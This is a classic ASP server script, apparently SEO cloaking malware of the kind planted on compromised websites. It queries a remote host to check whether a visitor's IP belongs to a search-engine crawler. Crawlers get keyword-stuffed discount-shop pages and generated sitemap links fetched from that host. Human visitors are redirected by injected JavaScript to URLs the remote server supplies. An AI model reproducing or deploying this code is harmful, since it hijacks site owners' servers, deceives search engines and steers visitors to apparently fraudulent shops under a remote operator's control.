<%
Function getHTTPPage(url) 
On Error Resume Next
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.setRequestHeader "User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0"  
Http.send() 
if Http.readystate<>4 then
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"utf-8")
set http=nothing
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b> </b></font></p>" 
Response.end
Err.Clear
End If  
End Function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function
Randomize
%>
<%
Dim Url,Html,hyzhdy,kname
kname=""
hyzhdy="http://jf2021.presshop.xyz/2021/doiid.aspx"
if request("productid")<>"" then
kname =getHTTPPage("http://jf2021.presshop.xyz/2021/gn.aspx?iid="&request("productid"))
end if
if request("kk")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("REMOTE_ADDR")
end if

ipurl="http://jf2021.presshop.xyz/getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if(instr(domain,"google")=0 and instr(domain,"msn.com")=0 and instr(domain,"yahoo.com")=0 and instr(domain,"aol.com")=0 and instr(domain,"yandex")=0) then
       if request("productid")<>""  then
  
ddd=getHTTPPage("http://jf2021.presshop.xyz/newurl.asp?cid="&request("categoryid")&"&new="&now()&"")

eee=ddd&Server.URLEncode(kname)
Response.write "<script>document.location="""&eee&"""</script>"
    end if
end if
%>
<%
Dim xy
if Request.ServerVariables("HTTPS")= "off" then
xy="http://"
else
xy="https://"
end if
if request("s")<>"" then
cid=INT((200-1+1)*rnd+1)
if request("categoryid")<>"" then
cid=request("categoryid")
end if
URL="http://jf2021.presshop.xyz/sjd.aspx?cid="&cid&"&number="&request("number")&"&pnum="&request("pnum")
con=getHTTPPage(URL)
con=Replace(con, "yymm", xy&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
con = Replace(con, "iid=", "productid=")
con = Replace(con, "cid=", "categoryid=")
Response.write con
Response.end
end if
%>
<%

if request("s")<>"" then
else
if request("productid")<>"" then
wid=INT((200-1+1)*RND+1)
URL=hyzhdy&"?iid="&request("productid")&"&mt=http://jf2021.presshop.xyz/en/333/"&wid&".txt&cid="&request("categoryid")
else
cid=INT((200-1+1)*rnd+1)
if request("categoryid")<>"" then
cid=request("categoryid")
end if
URL=hyzhdy&"?cid="&cid&"&pnum="&request("pnum")
end if
descriptions=getHTTPPage("http://jf2021.presshop.xyz/getci.aspx?cid="&request("categoryid")&"&s=4&e=5")


ddddd="<div style='display: block'><ul><li>Related links: <a href='?s=s&categoryid="&INT((30-1+1)*RND+1)&"&number=5000'>sitemap01</a></li><li>Related links: <a href='?s=s&categoryid="&INT((60-30+1)*RND+30)&"&number=5000'>sitemap02</a></li><li>Related links: <a href='?s=s&categoryid="&INT((90-60+1)*RND+60)&"&number=5000'>sitemap03</a></li><li>Related links: <a href='?s=s&categoryid="&INT((120-90+1)*RND+90)&"&number=5000'>sitemap04</a></li><li>Related links: <a href='?s=s&categoryid="&INT((160-120+1)*RND+120)&"&number=5000'>sitemap04</a></li><li>Related links: <a href='?s=s&categoryid="&INT((200-160+1)*RND+160)&"&number=5000'>sitemap005</a></li></ul></div>"
Dim ttttt,kkkkk,iiiii,ddddd
ttttt=kname&"> Latest trends > OFF-"&INT((75-50+1)*RND+50)&"%"&request("pnum")
kkkkk =kname
iiiii="Find your dream product at a discounted price,OFF-"&INT((75-50+1)*RND+50)&"%,"&kname&","&descriptions&""
con=getHTTPPage(URL)
con=Replace(con, "UUUUU", xy&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
con=Replace(con, "DDDDD", getHTTPPage("http://jf2021.presshop.xyz/youtobe.asp")&ddddd)
con=Replace(con, "TTTTT", ttttt)
con = Replace(con, "iid=", "productid=")
con = Replace(con, "cid=", "categoryid=")
con=Replace(con, "KKKKK", kkkkk)
con=Replace(con, "IIIII", iiiii)
con=Replace(con, "CCCCC", xy& Request.ServerVariables("HTTP_HOST") & Request.ServerVariables("PATH_INFO") & "?" & Request.ServerVariables("QUERY_STRING"))
end if
Response.write con
%> 